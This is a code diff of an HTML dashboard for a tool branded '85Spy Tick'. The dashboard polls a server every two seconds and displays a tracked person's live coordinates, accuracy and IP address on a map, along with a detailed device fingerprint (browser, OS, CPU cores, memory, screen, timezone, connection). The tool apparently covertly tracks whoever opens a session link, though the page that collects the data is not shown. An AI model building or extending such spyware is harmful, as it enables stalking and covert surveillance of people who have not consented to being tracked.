@@ -1,419 +1,577 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>85Spy Trick · Live location Updates</title>
+<title>85Spy Tick — Dashboard</title>
 
-    <link
-        rel="stylesheet"
-        href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
-    >
+<style>
+* {
+    box-sizing: border-box;
+}
 
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+body {
+    margin: 0;
+    min-height: 100vh;
+    background:
+        radial-gradient(circle at top, #082b20, #020807 45%, #000);
+    color: #00ff9d;
+    font-family: Consolas, monospace;
+    padding: 25px;
+}
 
-        body {
-            min-height: 100vh;
-            font-family: Arial, sans-serif;
-            background: #030712;
-            color: white;
-            overflow: hidden;
-        }
+.container {
+    width: min(1200px, 100%);
+    margin: auto;
+}
 
-        #map {
-            width: 100vw;
-            height: 100vh;
-        }
+.card {
+    background: rgba(0, 10, 7, .94);
+    border: 1px solid rgba(0,255,157,.3);
+    padding: 25px;
+    margin-bottom: 20px;
+    box-shadow: 0 0 35px rgba(0,255,157,.06);
+}
 
-        .panel {
-            position: fixed;
-            z-index: 1000;
-            top: 22px;
-            left: 22px;
-            width: 330px;
-            padding: 24px;
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 24px;
-            background: rgba(2,6,23,0.86);
-            backdrop-filter: blur(22px);
-            box-shadow:
-                0 25px 70px rgba(0,0,0,0.45);
-        }
+.brand {
+    letter-spacing: 4px;
+    font-size: 24px;
+    font-weight: bold;
+}
 
-        .brand {
-            font-size: 21px;
-            font-weight: 800;
-        }
+.header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 20px;
+    flex-wrap: wrap;
+}
 
-        .brand span {
-            color: #38bdf8;
-        }
+.live {
+    color: #00ff9d;
+    border: 1px solid #00ff9d;
+    padding: 8px 14px;
+    font-size: 12px;
+}
 
-        .subtitle {
-            margin-top: 6px;
-            color: #64748b;
-            font-size: 12px;
-        }
+h1 {
+    font-size: clamp(35px, 6vw, 60px);
+    margin: 30px 0 10px;
+    line-height: .95;
+}
 
-        .divider {
-            height: 1px;
-            margin: 20px 0;
-            background: rgba(255,255,255,0.08);
-        }
+h2 {
+    margin-top: 0;
+    font-size: 20px;
+}
 
-        .connection {
-            display: flex;
-            align-items: center;
-            gap: 9px;
-            color: #86efac;
-            font-size: 13px;
-            font-weight: 700;
-        }
+.grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 20px;
+}
 
-        .dot {
-            width: 9px;
-            height: 9px;
-            border-radius: 50%;
-            background: #22c55e;
-            box-shadow: 0 0 14px #22c55e;
-        }
+.info {
+    display: grid;
+    grid-template-columns: 180px 1fr;
+    gap: 10px;
+    border-bottom: 1px solid rgba(0,255,157,.08);
+    padding: 10px 0;
+}
 
-        .waiting {
-            color: #facc15;
-        }
+.label {
+    color: #638f80;
+}
 
-        .waiting .dot {
-            background: #facc15;
-            box-shadow: 0 0 14px #facc15;
-        }
+.value {
+    color: #b5ffe3;
+    word-break: break-word;
+}
 
-        .section {
-            margin-top: 22px;
-        }
+.coordinates {
+    font-size: 18px;
+    line-height: 1.8;
+}
 
-        .label {
-            margin-bottom: 7px;
-            color: #64748b;
-            font-size: 10px;
-            text-transform: uppercase;
-            letter-spacing: 1.2px;
-        }
+.map {
+    width: 100%;
+    height: 400px;
+    border: 1px solid rgba(0,255,157,.2);
+    background: #010604;
+    margin-top: 20px;
+}
 
-        .value {
-            color: #cbd5e1;
-            font-size: 14px;
-        }
+a {
+    color: #00ff9d;
+}
 
-        .metrics {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-top: 16px;
-        }
+.status {
+    color: #79a99a;
+    margin-top: 10px;
+}
 
-        .metric {
-            padding: 13px;
-            border-radius: 13px;
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.05);
-        }
+.session {
+    color: #45695c;
+    font-size: 11px;
+    word-break: break-all;
+}
 
-        .session {
-            margin-top: 22px;
-            color: #475569;
-            font-size: 10px;
-            line-height: 1.6;
-            word-break: break-all;
-        }
+@media (max-width: 750px) {
 
-        .session span {
-            color: #64748b;
-        }
+    .grid {
+        grid-template-columns: 1fr;
+    }
 
-        .leaflet-control-zoom {
-            border: none !important;
-        }
+    .info {
+        grid-template-columns: 1fr;
+    }
 
-        .leaflet-control-zoom a {
-            background: rgba(2,6,23,0.9) !important;
-            color: white !important;
-            border: 1px solid rgba(255,255,255,0.1) !important;
-        }
-
-        @media (max-width: 600px) {
-            .panel {
-                top: 12px;
-                left: 12px;
-                right: 12px;
-                width: auto;
-                padding: 20px;
-            }
-
-            .metrics {
-                grid-template-columns: 1fr 1fr;
-            }
-        }
-    </style>
+    .map {
+        height: 300px;
+    }
+}
+</style>
 </head>
 
 <body>
 
-    <div id="map"></div>
+<div class="container">
 
-    <section class="panel">
+<div class="card">
 
-        <div class="brand">
-            85<span>Spy Trick</span>
-        </div>
+<div class="header">
 
-        <div class="subtitle">
-            Live Location Updates:
-        </div>
+<div class="brand">
+85SPY TICK
+</div>
 
-        <div class="divider"></div>
+<div class="live" id="liveStatus">
+● WAITING FOR DATA
+</div>
 
-        <div class="connection waiting" id="connection">
-            <span class="dot"></span>
-            <span id="connectionText">
-                Waiting for location
-            </span>
-        </div>
+</div>
 
-        <div class="section">
+<h1>
+LIVE<br>
+DASHBOARD
+</h1>
 
-            <div class="label">
-                Last Update
-            </div>
+<div class="status" id="updateStatus">
+Waiting for incoming information...
+</div>
 
-            <div class="value" id="updated">
-                Waiting...
-            </div>
+<div class="session">
+SESSION: {{ session_id }}
+</div>
 
-        </div>
+</div>
 
-        <div class="metrics">
 
-            <div class="metric">
+<div class="grid">
 
-                <div class="label">
-                    Latitude
-                </div>
 
-                <div class="value" id="latitude">
-                    —
-                </div>
+<div class="card">
 
-            </div>
+<h2>
+LOCATION
+</h2>
 
-            <div class="metric">
+<div class="coordinates">
 
-                <div class="label">
-                    Longitude
-                </div>
+<div class="info">
+<div class="label">Latitude</div>
+<div class="value" id="latitude">Waiting...</div>
+</div>
 
-                <div class="value" id="longitude">
-                    —
-                </div>
+<div class="info">
+<div class="label">Longitude</div>
+<div class="value" id="longitude">Waiting...</div>
+</div>
 
-            </div>
+<div class="info">
+<div class="label">Accuracy</div>
+<div class="value" id="accuracy">Waiting...</div>
+</div>
 
-        </div>
+<div class="info">
+<div class="label">IP Address</div>
+<div class="value" id="locationIp">Waiting...</div>
+</div>
 
-        <div class="section">
+<div class="info">
+<div class="label">Last Update</div>
+<div class="value" id="locationTime">Waiting...</div>
+</div>
 
-            <div class="label">
-                Accuracy
-            </div>
+</div>
 
-            <div class="value" id="accuracy">
-                —
-            </div>
+<div class="map">
 
-        </div>
+<iframe
+id="map"
+width="100%"
+height="100%"
+frameborder="0"
+style="border:0"
+src="about:blank">
+</iframe>
 
-        <div class="session">
-            SESSION<br>
-            <span>{{ session_id }}</span>
-        </div>
+</div>
 
-    </section>
+</div>
 
 
-    <script
-        src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js">
-    </script>
+<div class="card">
 
+<h2>
+DEVICE INFORMATION
+</h2>
 
-    <script>
+<div class="info">
+<div class="label">Browser</div>
+<div class="value" id="browser">Waiting...</div>
+</div>
 
-        const map =
-            L.map("map", {
-                zoomControl: false
-            }).setView(
-                [0, 0],
-                2
-            );
-
-
-        L.tileLayer(
-            "https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png",
-            {
-                maxZoom: 19,
-                attribution:
-                    "&copy; OpenStreetMap contributors"
-            }
-        ).addTo(map);
-
-
-        L.control.zoom({
-            position: "bottomright"
-        }).addTo(map);
-
-
-        let marker = null;
-
-        let firstLocation = true;
-
-
-        async function updateLocation() {
-
-            try {
-
-                const response =
-                    await fetch(
-                        `/api/location/{{ session_id }}`
-                    );
-
-
-                const data =
-                    await response.json();
-
-
-                if (!data.location) {
-
-                    return;
-                }
-
-
-                const location =
-                    data.location;
-
-
-                const latitude =
-                    location.latitude;
-
-
-                const longitude =
-                    location.longitude;
-
-
-                if (!marker) {
-
-                    marker =
-                        L.marker([
-                            latitude,
-                            longitude
-                        ]).addTo(map);
-
-                } else {
-
-                    marker.setLatLng([
-                        latitude,
-                        longitude
-                    ]);
-
-                }
-
-
-                if (firstLocation) {
-
-                    map.setView(
-                        [
-                            latitude,
-                            longitude
-                        ],
-                        16
-                    );
-
-                    firstLocation = false;
-                }
-
-
-                document.getElementById(
-                    "latitude"
-                ).textContent =
-                    latitude.toFixed(6);
-
-
-                document.getElementById(
-                    "longitude"
-                ).textContent =
-                    longitude.toFixed(6);
-
-
-                document.getElementById(
-                    "accuracy"
-                ).textContent =
-                    location.accuracy
-                        ? Math.round(
-                            location.accuracy
-                        ) + " m"
-                        : "Unknown";
-
-
-                document.getElementById(
-                    "updated"
-                ).textContent =
-                    new Date(
-                        location.created_at
-                    ).toLocaleTimeString();
-
-
-                const connection =
-                    document.getElementById(
-                        "connection"
-                    );
-
-
-                const connectionText =
-                    document.getElementById(
-                        "connectionText"
-                    );
-
-
-                connection.classList.remove(
-                    "waiting"
-                );
-
-
-                connectionText.textContent =
-                    "Location Connected";
-
-
-            } catch (error) {
-
-                console.error(error);
-
-            }
-
-        }
-
-
-        updateLocation();
-
-
-        setInterval(
-            updateLocation,
-            2000
+<div class="info">
+<div class="label">Operating System</div>
+<div class="value" id="os">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">Device Type</div>
+<div class="value" id="deviceType">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">Platform</div>
+<div class="value" id="platform">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">User Agent</div>
+<div class="value" id="userAgent">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">Language</div>
+<div class="value" id="language">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">Timezone</div>
+<div class="value" id="timezone">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">Screen</div>
+<div class="value" id="screen">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">Pixel Ratio</div>
+<div class="value" id="pixelRatio">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">CPU Cores</div>
+<div class="value" id="cpuCores">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">Device Memory</div>
+<div class="value" id="deviceMemory">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">Touch Points</div>
+<div class="value" id="touchPoints">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">Online</div>
+<div class="value" id="online">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">Mobile</div>
+<div class="value" id="mobile">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">Connection</div>
+<div class="value" id="connection">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">Effective Connection</div>
+<div class="value" id="effectiveConnection">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">Downlink</div>
+<div class="value" id="downlink">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">RTT</div>
+<div class="value" id="rtt">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">Save Data</div>
+<div class="value" id="saveData">Waiting...</div>
+</div>
+
+<div class="info">
+<div class="label">Device IP</div>
+<div class="value" id="deviceIp">Waiting...</div>
+</div>
+
+</div>
+
+</div>
+
+
+<div class="card">
+
+<h2>
+SESSION INFORMATION
+</h2>
+
+<div class="info">
+<div class="label">Session ID</div>
+<div class="value" id="sessionId">
+{{ session_id }}
+</div>
+</div>
+
+<div class="info">
+<div class="label">Locations Received</div>
+<div class="value" id="locationCount">
+0
+</div>
+</div>
+
+<div class="info">
+<div class="label">Device Records</div>
+<div class="value" id="deviceCount">
+0
+</div>
+</div>
+
+</div>
+
+</div>
+
+
+<script>
+
+const sessionId = "{{ session_id }}";
+
+let lastLocationId = null;
+let lastDeviceId = null;
+
+function setValue(id, value) {
+
+    document.getElementById(id).textContent =
+        value === null ||
+        value === undefined ||
+        value === ""
+            ? "Unavailable"
+            : value;
+}
+
+function updateMap(latitude, longitude) {
+
+    const mapUrl =
+        "https://www.openstreetmap.org/export/embed.html?bbox=" +
+        (longitude - 0.01) +
+        "," +
+        (latitude - 0.01) +
+        "," +
+        (longitude + 0.01) +
+        "," +
+        (latitude + 0.01) +
+        "&layer=mapnik&marker=" +
+        latitude +
+        "," +
+        longitude;
+
+    document.getElementById("map").src = mapUrl;
+}
+
+function updateLocation(locations) {
+
+    if (!locations || !locations.length) {
+        return;
+    }
+
+    const location = locations[0];
+
+    setValue(
+        "latitude",
+        Number(location.latitude).toFixed(8)
+    );
+
+    setValue(
+        "longitude",
+        Number(location.longitude).toFixed(8)
+    );
+
+    setValue(
+        "accuracy",
+        location.accuracy !== null
+            ? Number(location.accuracy).toFixed(1) + " meters"
+            : "Unavailable"
+    );
+
+    setValue(
+        "locationIp",
+        location.ip_address
+    );
+
+    setValue(
+        "locationTime",
+        location.created_at
+            ? new Date(location.created_at).toLocaleString()
+            : "Unavailable"
+    );
+
+    updateMap(
+        Number(location.latitude),
+        Number(location.longitude)
+    );
+
+    document.getElementById("locationCount").textContent =
+        locations.length;
+
+    if (lastLocationId !== location.id) {
+
+        lastLocationId = location.id;
+
+        document.getElementById("liveStatus").textContent =
+            "● LIVE";
+
+        document.getElementById("updateStatus").textContent =
+            "Location data received.";
+    }
+}
+
+function updateDevice(devices) {
+
+    if (!devices || !devices.length) {
+        return;
+    }
+
+    const device = devices[0];
+
+    setValue("browser", device.browser);
+    setValue("os", device.operating_system);
+    setValue("deviceType", device.device_type);
+    setValue("platform", device.platform);
+    setValue("userAgent", device.user_agent);
+    setValue("language", device.language);
+    setValue("timezone", device.timezone);
+
+    setValue(
+        "screen",
+        device.screen_width +
+        " × " +
+        device.screen_height
+    );
+
+    setValue("pixelRatio", device.pixel_ratio);
+    setValue("cpuCores", device.cpu_cores);
+    setValue("deviceMemory", device.device_memory);
+    setValue("touchPoints", device.touch_points);
+    setValue("online", device.online);
+    setValue("mobile", device.mobile);
+
+    setValue(
+        "connection",
+        device.connection_type
+    );
+
+    setValue(
+        "effectiveConnection",
+        device.effective_connection_type
+    );
+
+    setValue(
+        "downlink",
+        device.downlink !== null
+            ? device.downlink + " Mbps"
+            : "Unavailable"
+    );
+
+    setValue(
+        "rtt",
+        device.rtt !== null
+            ? device.rtt + " ms"
+            : "Unavailable"
+    );
+
+    setValue(
+        "saveData",
+        device.save_data
+    );
+
+    setValue(
+        "deviceIp",
+        device.ip_address
+    );
+
+    document.getElementById("deviceCount").textContent =
+        devices.length;
+
+    if (lastDeviceId !== device.id) {
+        lastDeviceId = device.id;
+    }
+}
+
+async function loadDashboard() {
+
+    try {
+
+        const response = await fetch(
+            "/api/session/" + sessionId +
+            "?t=" + Date.now()
         );
 
-    </script>
+        if (!response.ok) {
+            throw new Error("Dashboard request failed.");
+        }
+
+        const data = await response.json();
+
+        if (!data.success) {
+            throw new Error(
+                data.error || "Unable to load session."
+            );
+        }
+
+        updateLocation(data.locations);
+        updateDevice(data.device_info);
+
+    } catch (error) {
+
+        document.getElementById("liveStatus").textContent =
+            "● CONNECTION ERROR";
+
+        document.getElementById("updateStatus").textContent =
+            "Unable to retrieve dashboard data.";
+    }
+}
+
+loadDashboard();
+
+setInterval(
+    loadDashboard,
+    2000
+);
+
+</script>
 
 </body>
 </html>
